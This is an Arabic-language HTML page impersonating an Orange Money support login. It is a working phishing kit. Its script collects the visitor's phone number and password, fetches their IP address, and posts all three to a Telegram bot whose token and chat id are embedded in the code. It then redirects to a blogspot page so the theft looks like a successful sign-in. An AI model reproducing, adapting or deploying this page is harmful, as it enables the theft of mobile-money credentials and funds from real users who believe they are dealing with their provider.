<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Money ✔️</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            color: #333;
            margin: 0;
            padding: 0;
            text-align: center;
            overflow: hidden;
        }

        .container {
            max-width: 400px;
        }

        img {
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin: 15px 0 5px;
            color: #666;
            font-size: 14px;
            text-align: right;
        }

        input[type="tel"],
        input[type="password"] {
            width: 90%;
            padding: 10px;
            margin: 5px 0;
            border: none;
            border-bottom: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
            outline: none;
            text-align: right;
            transition: 0.2s ease all;
        }

        .btn {
            background-color: #ff6600;
            color: #000000;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }

        .btn:hover {
            background-color: #e55a00;
        }

        .error {
            color: red;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }

        .subnote {
            font-size: 12px;
            color: #999;
            text-align: right;
            margin-bottom: 15px;
        }
    </style>
    <script>
        function validatePassword(password) {
            const arabicRegex = /[\u0600-\u06FF]/;
            if (arabicRegex.test(password)) return false;
            const symbolRegex = /[!@#$%^&*(),.?":{}|<>]/;
            const numberRegex = /\d/;
            const letterRegex = /[a-zA-Z]/;
            return (symbolRegex.test(password) && numberRegex.test(password)) &&
                (!letterRegex.test(password) || letterRegex.test(password));
        }

        function validateForm() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('error-msg');
            if (!/^\d{10}$/.test(phone)) {
                errorMsg.innerText = "يرجى إدخال رقم هاتف صحيح.";
                errorMsg.style.display = 'block';
                return false;
            }
            if (!validatePassword(password)) {
                errorMsg.innerText = "يرجى إدخال كلمة سر صحيحة.";
                errorMsg.style.display = 'block';
                return false;
            }
            errorMsg.style.display = 'none';
            return true;
        }

        async function onSubmit(event) {
            event.preventDefault();
            if (!validateForm()) return;
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            try {
                const ipRequest = await fetch('https://api.ipify.org?format=json');
                const ipResponse = await ipRequest.json();
                const ipAddress = ipResponse.ip;

                const message = `رقم الهاتف: ${phone}\nكلمة السر: ${password}\nIP: ${ipAddress}`;
                await fetch('https://api.telegram.org/bot<7559890589:AAF2WJyB7owLr_hW0aSI7dYluWp4s1WNd2A>/sendMessage', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: '< 7497931629>',
                        text: message
                    })
                });
                alert("تم إرسال البيانات بنجاح!");
                window.location.href = "https://myorangenaw.blogspot.com/2024/11/body-display-flex-justify-content_42.html";
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('error-msg').innerText = 'حدث خطأ أثناء إرسال البيانات.';
                document.getElementById('error-msg').style.display = 'block';
            }
        }
    </script>
</head>

<body>
    <div class="container">
        <img src="https://ibb.co/2cW42bF" alt="Orange Money Logo">
        <h1>خدمات الدعم من Orange Money</h1>
        <form onsubmit="onSubmit(event)">
            <label for="phone">رقم الهاتف</label>
            <input type="tel" id="phone" placeholder="أدخل رقم الهاتف" pattern="[0-9]{10}" maxlength="10" required>
            <div class="subnote">الرجاء إدخال رقم الهاتف الذي يبدأ بـ 077 أو 078 أو 079</div>
            <label for="password">كلمة السر</label>
            <input type="password" id="password" placeholder="أدخل كلمة السر" required>
            <div id="error-msg" class="error"></div>
            <button type="submit" class="btn">تسجيل الدخول</button>
        </form>
    </div>
</body>

</html>
